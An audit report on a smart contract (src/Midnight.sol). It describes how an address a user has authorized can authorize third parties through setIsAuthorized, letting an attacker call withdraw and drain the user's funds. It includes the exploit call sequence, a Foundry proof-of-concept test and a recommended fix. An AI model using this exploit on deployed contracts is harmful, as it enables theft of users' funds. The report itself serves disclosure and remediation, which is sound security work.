Audit Report

## Title
Transitive Authorization Escalation via Unscoped `setIsAuthorized` Allows Unauthorized Withdrawal of Victim Funds - (File: src/Midnight.sol)

## Summary
`setIsAuthorized` in `src/Midnight.sol` allows any address already authorized for a victim to grant further authorizations to arbitrary third parties, with no restriction on scope, market, action, or function. Because `withdraw` only checks `isAuthorized[onBehalf][msg.sender]`, an attacker granted authorization through this transitive path can immediately drain the victim's credit to an arbitrary receiver.

## Finding Description
**Root cause — `setIsAuthorized` (lines 731–735, `src/Midnight.sol`):**

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

The guard only verifies that `msg.sender` is already authorized for `onBehalf`. It places no restriction on what the caller may do with that authorization — specifically, it does not prevent the caller from granting further authorizations to arbitrary third parties on behalf of the original authorizer. [1](#0-0) 

**Exploit call sequence:**

1. **Victim** calls `setIsAuthorized(operator, true, victim)` — legitimately authorizing `operator` for some purpose.
   State: `isAuthorized[victim][operator] = true`.

2. **Operator** calls `setIsAuthorized(attacker, true, victim)`:
   - Guard: `isAuthorized[victim][operator]` → `true` ✓
   - State written: `isAuthorized[victim][attacker] = true`.

3. **Attacker** calls `withdraw(market, units, victim, attacker)`:
   - Guard at line 482: `isAuthorized[victim][attacker]` → `true` ✓
   - `units` of loan token are transferred to `attacker`.

**`withdraw` guard (line 482):**

```solidity
function withdraw(Market memory market, uint256 units, address onBehalf, address receiver) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    ...
    SafeTransferLib.safeTransfer(market.loanToken, receiver, units);
}
``` [2](#0-1) 

After step 2, `isAuthorized[victim][attacker]` is `true`, so the `withdraw` check passes unconditionally. There is no scope, market, action, or function restriction anywhere in the authorization mapping.

**Test confirmation — `testSetIsAuthorizedAuthorization` (lines 290–303, `test/AuthorizationTest.sol`):**

The existing test suite explicitly confirms this transitive escalation is the implemented behavior: after `authorized` is granted authorization for `user`, `authorized` successfully calls `setIsAuthorized(newAuthorized, true, user)`, and `isAuthorized(user, newAuthorized)` asserts `true`. [3](#0-2) 

## Impact Explanation
Any address that has been granted any authorization by a victim — even for a narrow purpose such as `setConsumed` or `take` — can immediately escalate to full control over the victim's credit in every market and drain all withdrawable funds to an arbitrary `receiver`. The impact is complete, unrecoverable loss of victim credit. This is a critical-severity finding: unauthorized fund extraction from user accounts.

## Likelihood Explanation
The precondition (victim has authorized at least one operator) is the normal operating state for any user relying on the authorization system — smart-contract wallets, aggregators, and periphery contracts all require this. The attack requires no special privileges, no oracle manipulation, no flash loan, and no user mistake beyond the initial legitimate authorization. It is executable in a single transaction and is repeatable across all markets simultaneously.

## Recommendation
Restrict `setIsAuthorized` so that only the account owner (`onBehalf == msg.sender`) can grant or revoke authorizations. Authorized operators should not be permitted to sub-delegate. Change the guard to:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

If sub-delegation is intentionally required for specific use cases, introduce a scoped authorization model (e.g., per-function or per-market permissions) so that an operator authorized for one action cannot escalate to `setIsAuthorized` or `withdraw`.

## Proof of Concept
The following Foundry test reproduces the full exploit:

```solidity
function testTransitiveAuthorizationDrain() public {
    address victim   = address(0x1);
    address operator = address(0x2);
    address attacker = address(0x3);

    // Step 1: victim legitimately authorizes operator
    vm.prank(victim);
    midnight.setIsAuthorized(operator, true, victim);

    // Step 2: operator escalates by granting attacker authorization for victim
    vm.prank(operator);
    midnight.setIsAuthorized(attacker, true, victim);

    // Confirm escalation
    assertTrue(midnight.isAuthorized(victim, attacker));

    // Step 3: attacker drains victim's credit
    vm.prank(attacker);
    midnight.withdraw(market, victimCreditUnits, victim, attacker);

    // Victim's credit is now zero; attacker holds the loan tokens
    assertEq(midnight.position(marketId, victim).credit, 0);
}
```

This maps directly to the behavior confirmed by `testSetIsAuthorizedAuthorization` in `test/AuthorizationTest.sol` (lines 290–303). [4](#0-3)

### Citations

**File:** src/Midnight.sol (L481-499)
```text
    function withdraw(Market memory market, uint256 units, address onBehalf, address receiver) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
        MarketState storage _marketState = marketState[id];
        _updatePosition(market, id, onBehalf);

        Position storage _position = position[id][onBehalf];
        uint128 pendingFeeDecrease;
        if (_position.credit > 0) {
            pendingFeeDecrease = UtilsLib.toUint128(_position.pendingFee.mulDivUp(units, _position.credit));
            _position.pendingFee -= pendingFeeDecrease;
        }
        _position.credit -= UtilsLib.toUint128(units);
        _marketState.withdrawable -= UtilsLib.toUint128(units);
        _marketState.totalUnits -= UtilsLib.toUint128(units);

        emit EventsLib.Withdraw(msg.sender, id, units, onBehalf, receiver, pendingFeeDecrease);

        SafeTransferLib.safeTransfer(market.loanToken, receiver, units);
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```
